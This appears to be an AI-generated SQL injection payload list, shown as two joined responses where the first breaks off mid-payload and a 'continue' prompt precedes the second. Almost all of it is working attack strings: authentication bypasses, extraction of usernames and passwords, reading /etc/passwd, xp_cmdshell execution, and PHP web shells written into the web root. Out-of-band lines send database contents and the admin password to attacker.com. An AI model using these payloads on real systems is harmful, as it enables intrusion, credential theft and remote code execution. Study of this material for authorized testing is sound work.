

# SQL Injection (SQLi) Payloads List

Below is a collection of common SQL injection payloads categorized by attack type and database technology.

## Basic Authentication Bypass

```
' OR '1'='1
' OR 1=1 --
' OR 1=1 #
admin' --
admin' #
admin'/*
admin' OR '1'='1
```

## Union-Based Attacks

```
UNION SELECT null,username,password FROM users--
UNION SELECT 1,2,3,4--
UNION ALL SELECT database(),user(),version()--
```

## Error-Based Attacks

```
AND (SELECT 0 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)
AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),0)
EXTRACTVALUE(rand(),concat(0x3a,(select database())))
```

## Boolean-Based Blind SQLi

```
AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
AND ASCII(SUBSTRING((SELECT database()),1,1))>100
```

## Time-Based Blind SQLi

```
IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
; WAITFOR DELAY '0:0:5' --
OR (SELECT * FROM (SELECT(SLEEP(5)))a)
```

## Database-Specific Payloads

### MySQL
```
@@version
LOAD_FILE('/etc/passwd')
INTO OUTFILE '/var/www/html/shell.php'
CONNECTION_ID()
```

### MSSQL
```
@@SERVERNAME
xp_cmdshell('whoami')
WAITFOR DELAY '0:0:5'
```

### Oracle
```
(SELECT banner FROM v$version WHERE rownum=1)
UTL_HTTP.REQUEST('http://attacker.com')
DBMS_LOCK.SLEEP(5)
```

### PostgreSQL
```
current_database()
pg_sleep(5)
COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'
```

## Out-of-Band Techniques

```
||UTL_HTTP.request('http://attacker.com/'||database())--
EXEC master..xp_dirtree '\\att

continue

 Here’s a list of common SQL injection (SQLi) payloads categorized by attack type. These can be used for testing and understanding SQL injection vulnerabilities (only in authorized environments like penetration testing or CTFs).

---

### **1. Basic Authentication Bypass**
```sql
' OR '1'='1
' OR 1=1 -- 
" OR "" = "
admin' --
admin' OR '1'='1
```

---

### **2. UNION-Based Attacks**
Extract data from other tables using `UNION SELECT`:
```sql
' UNION SELECT 1,2,3 -- 
' UNION SELECT username, password, NULL FROM users -- 
```

---

### **3. Error-Based SQLi**
Trigger database errors to extract information:
```sql
' AND (SELECT 0 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- 
```

---

### **4. Boolean-Based Blind SQLi**
True/False conditions to infer data:
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a' -- 
```

---

### **5. Time-Based Blind SQLi**
Delay-based inference:
```sql
'; IF (SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a') WAITFOR DELAY '0:0:5' -- 
```

---

### **6. Out-of-Band Data Exfiltration**
Exfiltrate data via DNS/HTTP requests:
```sql
'; DECLARE @data VARCHAR(1024); SET @data=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"') -- 
```

---

### **7. File System Access**
Read/write files (if DB permissions allow):
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL -- 
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php' -- 
```

---

### **8. Database-Specific Payloads**

#### **MySQL / MariaDB**
```sql
-- Version check  
SELECT @@version  

-- List databases  
SELECT schema_name FROM information_schema.schemata